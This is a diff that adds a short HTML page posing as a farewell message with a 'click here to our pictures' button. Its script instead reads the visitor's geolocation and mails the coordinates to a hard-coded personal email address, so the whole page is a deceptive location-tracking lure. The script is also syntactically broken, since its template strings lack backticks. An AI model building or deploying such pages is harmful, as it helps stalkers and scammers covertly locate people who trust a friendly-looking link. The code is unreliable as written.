@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>we will miss you</title>
+</head>
+<body>
+    <h2>we are miss you</h2>
+    <button onclick="sendLocation()">click here to our pictures</button>
+
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    
+                    let email = "goutamsolanki49@gmail.com";
+                    let subject = "User Location";
+                    let body = Latitude: ${latitude}, Longitude: ${longitude};
+                    
+                    window.location.href = mailto:${email}?subject=${subject}&body=${body};
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+    </script>
+</body>
+</html>
